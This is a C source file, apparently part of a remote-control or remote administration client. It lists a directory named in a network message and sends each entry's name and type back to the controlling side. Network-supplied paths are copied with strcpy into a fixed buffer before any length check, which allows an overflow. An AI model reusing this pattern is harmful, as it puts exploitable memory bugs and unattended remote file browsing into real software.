#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include "types.h"
#include "cmd/commands.h"
#include "net/interface.h"
#include "net/error.h"

#define HDD_PATH_MAX 260

#define COMMANDS_HDD_LS_END 0xDC
#define COMMANDS_HDD_LS_DATA_F 0xCD //file
#define COMMANDS_HDD_LS_DATA_D 0xCE //folder
#define COMMANDS_HDD_LS_DATA_U 0xCF //unknown
#define COMMANDS_HDD_LS_PATH_TO_BIG 0xCA
#define COMMANDS_HDD_LS_CANT_GET_INFO 0xC0

int command_hdd_Ls(uint8* msg)
{
	DIR *dir = opendir((char*)msg);

	if(!dir)
	{
		if(net_SendCmd((uint8*)" ", 1, COMMANDS_DISAPPROVE) == NET_LOST_CONNECTION) 
		{
			return NET_LOST_CONNECTION;	
		}

		return COMMANDS_SUCC;
	}

	if(net_SendCmd((uint8*)" ", 1, COMMANDS_APPROVE) == NET_LOST_CONNECTION) 
	{
		return NET_LOST_CONNECTION;	
	}

	uint8* rmsg;
	struct stat fbuf;
	struct dirent *_dir;
	char path[2048];
	int pathLen = strlen((char*)msg);
	int type = COMMANDS_HDD_LS_DATA_U;

	while((_dir = readdir(dir)) != NULL)
	{
		memset(path, 0, 2048);
		strcpy(path, (char*)msg);
		strcpy(path + pathLen, _dir->d_name);

		if(strlen(path) > HDD_PATH_MAX)
		{
			if(net_SendCmd((uint8*)" ", 1, COMMANDS_HDD_LS_PATH_TO_BIG) == NET_LOST_CONNECTION) 
			{
				return NET_LOST_CONNECTION;	
			}
		}else{
			if(stat(path, &fbuf) == -1)
			{
				if(net_SendCmd((uint8*)" ", 1, COMMANDS_HDD_LS_CANT_GET_INFO) == NET_LOST_CONNECTION) 
				{
					return NET_LOST_CONNECTION;	
				}
			}else{
				if(S_ISDIR(fbuf.st_mode))
				{
					type = COMMANDS_HDD_LS_DATA_D;
				}else if(S_ISREG(fbuf.st_mode)){
					type = COMMANDS_HDD_LS_DATA_F;
				}else{
					type = COMMANDS_HDD_LS_DATA_U;
				}

				if(net_SendCmd((uint8*)_dir->d_name, strlen(_dir->d_name), type) == NET_LOST_CONNECTION)
				{
					return NET_LOST_CONNECTION;
				}
			}
		}

		if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
		{
			return NET_LOST_CONNECTION;
		}

		free(rmsg);
	}

	if(net_SendCmd((uint8*)" ", 1, COMMANDS_HDD_LS_END) == NET_LOST_CONNECTION) 
	{
		return NET_LOST_CONNECTION;	
	}

	closedir(dir);

	return COMMANDS_SUCC;
}